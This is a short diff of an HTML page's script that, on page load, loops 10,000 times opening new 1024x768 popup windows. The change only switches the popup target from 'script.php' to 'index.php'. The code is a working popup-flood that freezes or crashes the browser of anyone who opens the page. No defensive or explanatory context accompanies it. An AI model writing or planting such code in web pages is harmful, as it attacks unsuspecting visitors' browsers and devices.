@@ -13,7 +13,7 @@ window.onload = function() {
 
   const MAX = 10000;
   for (let i = 0; i < MAX; i++) {
-    window.open("script.php", "_blank", "width=1024,height=768");
+    window.open("index.php", "_blank", "width=1024,height=768");
   }
 };
 </script>
